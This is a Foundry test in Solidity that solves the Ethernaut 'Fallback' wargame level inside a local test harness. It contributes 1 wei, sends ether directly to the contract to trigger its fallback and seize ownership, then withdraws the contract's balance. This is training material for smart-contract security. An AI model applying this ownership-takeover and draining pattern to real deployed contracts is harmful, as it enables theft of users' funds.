// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";
// forge test --match-contract FallbackTest -vvvv
contract FallbackTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testFallbackHack() public {
        /****************
          Factory setup
        *************** */
        FallbackFactory fallbackFactory = new FallbackFactory();
        // Link the factory
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        /****************
          Attack
        *************** */

        // Contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(player), 1 wei);

        // Call contract with minimum value to trigger fallback
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        // Verify contract owner has changed to our address
        assertEq(ethernautFallback.owner(), player);

        // Withdraw from contract - Check contract balance before and after
        emit log_named_uint(
            "Fallback contract balance",
            address(ethernautFallback).balance
        );
        ethernautFallback.withdraw();
        emit log_named_uint(
            "Fallback contract balance",
            address(ethernautFallback).balance
        );

        /****************
          Level Submission
        *************** */

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
